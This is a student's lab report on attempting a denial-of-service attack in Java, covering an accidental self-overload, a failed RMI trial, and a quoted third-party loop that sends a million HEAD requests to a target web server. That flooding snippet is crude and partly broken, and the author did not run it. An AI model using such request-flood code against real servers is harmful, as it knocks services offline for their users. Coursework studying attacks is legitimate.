###Network Attack
As in keylogger case, again I tried to do my best in order to get this project done in java. Here is something java definitelly cannot do, at least I could not find a good way to implemented it. Mainly it should not be possible because the JVM(Java Virtual Machine) would limit the amount of memory `java` process can consume. Because thats the main feature of java, to run inside its own environment. 

####Trials

#####Trial #1: Bug or Feature?
I have tried to create a simple server-client application and opened many many connections on same computer. Actually, by mistake on first laboratory work, while implementing multi-threading.

I started about 5 instances of java application, which creates a lot of threads. After some time, my pc started to lag and upon analyzing the resources I saw that I am doing something wrong. This could be some kind of DOS(Denial Of Service), I consumed my own resources, by creating multiple instances of java; all together it used about 4 Gb of ram memory, out of 8 Gb. 

The mistake was done mainly because:
   * I was not used to intelijIdea IDE (usually I use Android Studio)
   * I was sleepy and created a while loop in the wrong way

#####Trial #2: using RMI in JAVA
RMI stands for Remote Method Invocation, it directly transfers serialized Java classes and distributed garbage collection. 

I have read more about it, but still did not get how it works.

Some people succeeded to make it work, but still, they got a maximum of 60-70% memory load. I think my mistake from Trial #1 was way more successful. 

#####Trial #3: Simple Multiple Instances of Java
There is one guy who tried to DOS his own apache server by sending a milion packets to it.

		 for (int i = 1; i < 1000000; i++) {
            if ((checkshell.exists("http://"+TARGET+"")) == true)  {     
               System.out.println("Sent request " + i+" Times with " +i+" Connection");
              }
           else{
               if ((checkshell.exists("http://"+TARGET+"")) == false)  {    
                   System.out.println("Error after " +i+" Connection !!!");
                }  
             }
         }

And when calling `checkshell.exists()` the following code is executed:

			int TIMEOUT_VALUE = 0;
	   try {
	      HttpURLConnection.setFollowRedirects(false);
	      HttpURLConnection con =(HttpURLConnection) new URL(URLName).openConnection();
	      con.setInstanceFollowRedirects(false);
	      con.setConnectTimeout(TIMEOUT_VALUE);
	      con.setReadTimeout(TIMEOUT_VALUE);
	      con.setConnectTimeout(TIMEOUT_VALUE);
	      con.setRequestMethod("HEAD");   
	      con.addRequestProperty("User-Agent", userAgentPayload);
	      con.disconnect();
	      return (con.getResponseCode() == HttpURLConnection.HTTP_OK);
	    }

As you can see, the server could not take it anymore, and stopped responding:

![self dos](http://i.imgur.com/ACwFVne.jpg "self dos")

But I haven't tried it myself, as I would have to create the server on Virtual Machine first, and it is on Windows.


####Conclusion
Java is definitelly not for DOSing, I would preferably use Python, and give it a try. But at least I have seen how it works and how exactly a simple DOS application should work. 

In future, I will be more careful when working with multiple threads, and when requesting a lot of data from a server.


